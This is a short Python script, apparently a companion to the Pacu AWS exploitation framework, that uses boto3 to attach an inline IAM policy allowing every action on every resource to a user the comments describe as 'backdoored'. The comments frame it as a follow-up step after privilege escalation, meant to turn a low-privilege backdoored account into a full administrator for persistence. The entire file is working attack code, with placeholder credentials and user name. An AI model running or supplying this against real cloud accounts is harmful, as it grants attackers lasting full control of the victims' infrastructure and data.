import boto3
import botocore
# Purpose of this script was because - Pacu doesn't allow us to elevate the privilege of another user.
# Only use this script - if you have escalated privilege and want to elevate a backdoored user as
# there might be times when the remaining users do not have high privileges, so we can only backdoor those low privileged user (But what's the point --> So, Elevate it)

client = boto3.client(
    'iam',
    aws_access_key_id='ACCESS',
    aws_secret_access_key='SECRET'
)

backdooredUser = "USER" # Change this to the user you backdoored in Pacu

try:
    response = client.put_user_policy(
        PolicyDocument = '{"Version":"2012-10-17","Statement":{"Effect":"Allow","Action":"*","Resource":"*"}}',
        PolicyName = 'backdoorPriv',
        UserName = backdooredUser
        )
    if response['ResponseMetadata']['HTTPStatusCode'] == 200:
        print (f"Backdoored User - {backdooredUser} now has highest privilege!")
    else:
        print (f"An Error has occured, please try running the script again.")
except botocore.exceptions.ClientError as e:
    if "AccessDenied" in str(e):
        print (f"The credentials doesn't have enough permissions, or privilege to grant high permissions to {backdooredUser}. Please modify the credential and try again.")
    else:
        print ("ERRORDETECTED. Quitting script now.")
        exit()
